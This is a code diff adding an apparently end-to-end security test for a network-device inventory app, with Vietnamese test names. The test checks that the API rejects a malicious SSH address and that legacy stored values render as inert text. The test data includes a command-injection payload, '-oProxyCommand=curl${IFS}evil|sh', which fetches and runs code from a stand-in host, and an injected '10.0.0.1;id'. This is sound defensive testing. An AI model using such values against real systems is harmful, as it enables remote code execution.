@@ -8,6 +8,7 @@ import {
   resetCatalog,
   resetDevices,
   resetUsers,
+  sql,
   uniqueStamp,
   writeHeaders,
 } from './helpers';
@@ -194,6 +195,26 @@ test.describe('Model thiết bị (Q-26)', () => {
     await page.getByRole('option', { name: new RegExp(printer) }).click();
     await expect(form.getByText(`Model ${printer} không gắn tủ — máy chỉ cần Site.`)).toBeVisible();
     await expect(form.getByRole('button', { name: 'Tủ mạng' })).toHaveCount(0);
+  });
+
+  test('đòn chèn lệnh qua Truy cập quản trị: API từ chối địa chỉ SSH độc; dữ liệu cũ đã lỡ lưu thì trang chỉ hiện chữ, không có lệnh để chép', async ({ page }) => {
+    await firstLogin(page, E2E_SA);
+    const stamp = uniqueStamp();
+    const typeId = await switchTypeId(page);
+    const attack = await page.request.post('/api/v1/devices', {
+      headers: await writeHeaders(page),
+      data: { code: `SW-E2E-INJ${stamp}`, name: 'Máy độc', deviceTypeId: typeId, accessPoints: [{ kind: 'ssh', address: '-oProxyCommand=curl${IFS}evil|sh' }] },
+      failOnStatusCode: false,
+    });
+    expect(attack.status()).toBe(400);
+    expect(await attack.json()).toMatchObject({ code: 'DEVICE_ACCESS_INVALID' });
+    // Dữ liệu cũ ghi thẳng vào DB (trước khi có luật): trang không dựng lệnh từ nó.
+    const id = await createDevice(page, { code: `SW-E2E-INJ${stamp}`, name: 'Máy cũ', deviceTypeId: typeId });
+    sql(`UPDATE device SET access_points = '[{"kind":"ssh","address":"10.0.0.1;id","port":null}]'::jsonb WHERE id = '${id}'`);
+    await page.goto(`/devices/${id}`);
+    await expect(page.getByText('10.0.0.1;id')).toBeVisible();
+    await expect(page.getByRole('button', { name: 'Chép lệnh' })).toHaveCount(0);
+    await expect(page.locator('code')).toHaveCount(0);
   });
 
   test('cổng mẫu: model Gi1/0/[1-48] + Te1/1/[1-4] → máy có 52 cổng; dây vào Gi1/0/1 thì ô đó đang dùng; mẫu dải ngược bị báo tại chỗ', async ({ page }) => {
